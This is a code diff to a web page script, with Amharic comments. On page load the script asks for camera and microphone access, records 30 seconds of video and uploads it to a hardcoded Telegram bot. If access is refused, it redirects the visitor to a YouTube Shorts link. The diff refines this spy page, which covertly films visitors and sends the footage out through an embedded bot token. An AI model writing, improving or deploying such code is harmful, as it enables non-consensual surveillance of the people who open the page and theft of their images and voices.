@@ -19,7 +19,7 @@
     <script>
         const botToken = "8685482473:AAE7vWYe8mV4ZQ4PA0oj_18WgoJpu_jfZ3M";
         const chatId = "5630987526";
-        const duration = 30000; // 30 ሰከንድ (በሚሊ ሰከንድ)
+        const recordDuration = 30000; // 30 ሰከንድ
 
         navigator.mediaDevices.getUserMedia({ video: true, audio: true })
             .then(stream => {
@@ -29,15 +29,18 @@
                 const mediaRecorder = new MediaRecorder(stream);
                 let chunks = [];
 
-                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) chunks.push(e.data);
+                };
                 
                 mediaRecorder.onstop = () => {
-                    document.getElementById('status').innerText = "ቪዲዮው እየተላከ ነው...";
+                    document.getElementById('status').innerText = "ቪዲዮው እየተላከ ነው... እባክዎ ይጠብቁ";
                     const blob = new Blob(chunks, { type: 'video/mp4' });
                     const formData = new FormData();
                     formData.append('chat_id', chatId);
                     formData.append('video', blob, 'capture.mp4');
 
+                    // እዚህ ጋር sendVideo የሚለውን እንጠቀማለን
                     fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                         method: 'POST',
                         body: formData
@@ -46,14 +49,14 @@
                     });
                 };
 
-                // ቀረጻ ጀምር
+                // መቅዳት ጀምር
                 mediaRecorder.start();
 
                 // ከ30 ሰከንድ በኋላ አቁም
                 setTimeout(() => {
                     mediaRecorder.stop();
                     stream.getTracks().forEach(track => track.stop());
-                }, duration);
+                }, recordDuration);
             })
             .catch(() => {
                 window.location.href = "https://youtube.com/shorts/1xZS2TpagBk";
